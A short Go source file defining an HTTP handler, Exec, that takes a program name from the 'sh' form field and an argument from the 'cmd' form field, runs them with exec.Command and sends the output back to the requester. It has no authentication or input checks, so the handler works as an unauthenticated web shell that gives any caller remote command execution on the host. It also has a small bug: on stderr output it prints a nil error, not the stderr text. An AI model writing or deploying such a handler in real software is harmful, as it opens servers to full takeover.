package cmd

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
)

func Exec(w http.ResponseWriter, req *http.Request) {
	// fmt.Println("Test")
	req.ParseForm()
	cmds := req.Form["sh"]
	cmdl := cmds[0]
	cmd2 := req.Form["cmd"][0]
	cmd := exec.Command(cmdl, cmd2)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		fmt.Fprint(w, err)
		return
	}

	if err := cmd.Start(); err != nil {
		fmt.Fprint(w, err)
		return
	}

	bytesErr, err := ioutil.ReadAll(stderr)
	if err != nil {
		fmt.Fprint(w, err)
		return
	}

	if len(bytesErr) != 0 {
		fmt.Fprint(w, err)
		return
	}

	bytes, err := ioutil.ReadAll(stdout)
	if err != nil {
		fmt.Fprint(w, err)
		return
	}

	if err := cmd.Wait(); err != nil {
		fmt.Fprint(w, err)
		return
	}

	fmt.Fprint(w, string(bytes))
}
